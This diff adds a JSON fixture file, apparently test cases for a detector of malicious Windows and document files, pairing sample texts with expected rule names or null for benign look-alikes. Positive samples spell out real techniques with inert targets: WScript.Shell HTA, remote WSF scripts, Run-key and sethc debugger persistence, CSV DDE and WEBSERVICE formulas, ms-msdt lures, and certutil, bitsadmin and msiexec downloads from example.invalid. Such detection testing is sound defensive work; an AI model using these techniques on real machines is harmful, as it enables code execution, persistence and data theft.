@@ -1,0 +1,180 @@
+[
+  {
+    "name": "hta_shell.hta",
+    "text": "<html><head><hta:application id=\"x\"/><script>var o = new ActiveXObject(\"WScript.Shell\");</script></head></html>",
+    "expected": "win_hta_shell_object"
+  },
+  {
+    "name": "hta_shell_utf16.bin",
+    "text": "<html><head><hta:application id=\"x\"/><script>var o = new ActiveXObject(\"WScript.Shell\");</script></head></html>",
+    "expected": "win_hta_shell_object",
+    "encoding": "utf-16le"
+  },
+  {
+    "name": "hta_shell.zip",
+    "text": "<html><head><hta:application id=\"x\"/><script>var o = new ActiveXObject(\"WScript.Shell\");</script></head></html>",
+    "expected": "win_hta_shell_object",
+    "container": "zip"
+  },
+  {
+    "name": "hta_plain.hta",
+    "text": "<html><head><hta:application id=\"x\"/><script>document.title = \"inert\";</script></head></html>",
+    "expected": null
+  },
+  {
+    "name": "html_shell_no_hta.html",
+    "text": "<html><script>var o = new ActiveXObject(\"WScript.Shell\");</script></html>",
+    "expected": null
+  },
+  {
+    "name": "wsf_remote.wsf",
+    "text": "<job id=\"x\"><script language=\"JScript\" src=\"https://example.invalid/inert.js\"></script></job>",
+    "expected": "win_wsf_remote_script"
+  },
+  {
+    "name": "wsf_unc.wsf",
+    "text": "<package><job id=\"x\"><script language=\"VBScript\" src=\"\\\\192.0.2.10\\share\\inert.vbs\"></script></job></package>",
+    "expected": "win_wsf_remote_script"
+  },
+  {
+    "name": "wsf_local.wsf",
+    "text": "<job id=\"x\"><script language=\"JScript\" src=\"helpers.js\"></script></job>",
+    "expected": null
+  },
+  {
+    "name": "html_remote_script.html",
+    "text": "<html><script src=\"https://example.invalid/app.js\"></script></html>",
+    "expected": null
+  },
+  {
+    "name": "msc_url.msc",
+    "text": "<?xml version=\"1.0\"?><MMC_ConsoleFile ConsoleVersion=\"3.0\"><StringTable><String ID=\"1\">https://example.invalid/inert.html</String></StringTable></MMC_ConsoleFile>",
+    "expected": "win_msc_console_remote"
+  },
+  {
+    "name": "msc_apds.msc",
+    "text": "<?xml version=\"1.0\"?><MMC_ConsoleFile ConsoleVersion=\"3.0\"><StringTable><String ID=\"1\">res://apds.dll/redirect.html</String></StringTable></MMC_ConsoleFile>",
+    "expected": "win_msc_console_remote"
+  },
+  {
+    "name": "msc_local.msc",
+    "text": "<?xml version=\"1.0\"?><MMC_ConsoleFile ConsoleVersion=\"3.0\"><StringTable><String ID=\"1\">Services (Local)</String></StringTable></MMC_ConsoleFile>",
+    "expected": null
+  },
+  {
+    "name": "reg_run_mshta.reg",
+    "text": "Windows Registry Editor Version 5.00\r\n\r\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]\r\n\"Updater\"=\"mshta.exe C:\\inert\\page.hta\"\r\n",
+    "expected": "win_reg_run_interpreter"
+  },
+  {
+    "name": "reg_run_mshta_utf16.reg",
+    "text": "Windows Registry Editor Version 5.00\r\n\r\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]\r\n\"Updater\"=\"mshta.exe C:\\inert\\page.hta\"\r\n",
+    "expected": "win_reg_run_interpreter",
+    "encoding": "utf-16le"
+  },
+  {
+    "name": "reg_ifeo.reg",
+    "text": "Windows Registry Editor Version 5.00\r\n\r\n[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe]\r\n\"Debugger\"=\"C:\\inert\\tool.exe\"\r\n",
+    "expected": "win_reg_run_interpreter"
+  },
+  {
+    "name": "reg_run_program.reg",
+    "text": "Windows Registry Editor Version 5.00\r\n\r\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]\r\n\"OneDrive\"=\"C:\\Users\\me\\AppData\\Local\\OneDrive\\OneDrive.exe /background\"\r\n",
+    "expected": null
+  },
+  {
+    "name": "reg_other_key.reg",
+    "text": "Windows Registry Editor Version 5.00\r\n\r\n[HKEY_CURRENT_USER\\Software\\Example]\r\n\"Shell\"=\"powershell\"\r\n",
+    "expected": null
+  },
+  {
+    "name": "csv_dde.csv",
+    "text": "name,amount\r\n=cmd|' /C inert'!A0,1\r\n",
+    "expected": "doc_spreadsheet_formula_exec"
+  },
+  {
+    "name": "csv_webservice.csv",
+    "text": "id,value\r\n1,=WEBSERVICE(\"https://example.invalid/?x=\"&A1)\r\n",
+    "expected": "doc_spreadsheet_formula_exec"
+  },
+  {
+    "name": "csv_sum.csv",
+    "text": "name,amount\r\n=SUM(A1:A2),1\r\n",
+    "expected": null
+  },
+  {
+    "name": "csv_negative.csv",
+    "text": "name,amount\r\nrefund,-cmd budget line\r\n",
+    "expected": null
+  },
+  {
+    "name": "slk_call.slk",
+    "text": "ID;P\r\nC;X1;Y1;ECALL(\"Shell32\",\"ShellExecuteA\",\"JJCCCJJ\",0,\"open\",\"inert.exe\",0,0,5)\r\nE\r\n",
+    "expected": "doc_spreadsheet_formula_exec"
+  },
+  {
+    "name": "slk_plain.slk",
+    "text": "ID;P\r\nC;X1;Y1;K42\r\nE\r\n",
+    "expected": null
+  },
+  {
+    "name": "iqy_remote.iqy",
+    "text": "WEB\r\n1\r\nhttps://example.invalid/query.php\r\n",
+    "expected": "doc_spreadsheet_formula_exec"
+  },
+  {
+    "name": "iqy_notes.txt",
+    "text": "WEB QUERY NOTES\r\nhttps://example.invalid/docs\r\n",
+    "expected": null
+  },
+  {
+    "name": "msdt_link.html",
+    "text": "<a href=\"ms-msdt:/id PCWDiagnostic /skip force /param IT_RebrowseForFile=x IT_BrowseForFile=$(inert)\">x</a>",
+    "expected": "web_ms_protocol_lure"
+  },
+  {
+    "name": "appinstaller_link.html",
+    "text": "<a href=\"ms-appinstaller:?source=https://example.invalid/inert.msix\">install</a>",
+    "expected": "web_ms_protocol_lure"
+  },
+  {
+    "name": "settings_link.html",
+    "text": "<a href=\"ms-settings:windowsupdate\">settings</a>",
+    "expected": null
+  },
+  {
+    "name": "msdt_mention.md",
+    "text": "The ms-msdt: handler was removed by the June 2022 update.",
+    "expected": null
+  },
+  {
+    "name": "certutil_download.cmd",
+    "text": "certutil -urlcache -split -f https://example.invalid/inert.txt inert.txt\n",
+    "expected": "win_lolbin_download"
+  },
+  {
+    "name": "bitsadmin_download.cmd",
+    "text": "bitsadmin /transfer job /download /priority high https://example.invalid/inert.txt %TEMP%\\inert.txt\n",
+    "expected": "win_lolbin_download"
+  },
+  {
+    "name": "msiexec_remote.cmd",
+    "text": "msiexec /i https://example.invalid/inert.msi /qn\n",
+    "expected": "win_lolbin_download"
+  },
+  {
+    "name": "certutil_hash.cmd",
+    "text": "certutil -hashfile inert.txt SHA256\n",
+    "expected": null
+  },
+  {
+    "name": "msiexec_local.cmd",
+    "text": "msiexec /i C:\\installers\\inert.msi /qn\n",
+    "expected": null
+  },
+  {
+    "name": "bitsadmin_list.cmd",
+    "text": "bitsadmin /list /allusers\n",
+    "expected": null
+  }
+]
